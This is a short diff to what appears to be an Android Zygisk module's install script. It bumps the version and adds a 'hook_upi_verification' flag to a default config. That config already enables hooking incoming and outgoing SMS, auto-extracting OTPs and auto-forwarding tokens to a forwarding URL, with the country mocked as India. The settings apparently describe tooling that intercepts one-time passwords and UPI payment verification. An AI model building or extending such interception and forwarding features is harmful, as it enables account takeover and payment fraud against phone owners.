@@ -4,7 +4,7 @@
 SKIPUNZIP=1
 
 ui_print "*******************************"
-ui_print "   Hivirtus Zygisk Mode v2.3.1  "
+ui_print "   Hivirtus Zygisk Mode v2.8.0  "
 ui_print "*******************************"
 
 if [ -z "$MODPATH" ]; then
@@ -48,6 +48,7 @@ if [ ! -f "$MODPATH/config.json" ]; then
   "mock_country_iso": "in",
   "hook_incoming_sms": true,
   "hook_outgoing_sms": true,
+  "hook_upi_verification": true,
   "auto_extract_otp": true,
   "auto_forward_token": true,
   "forward_url": "",
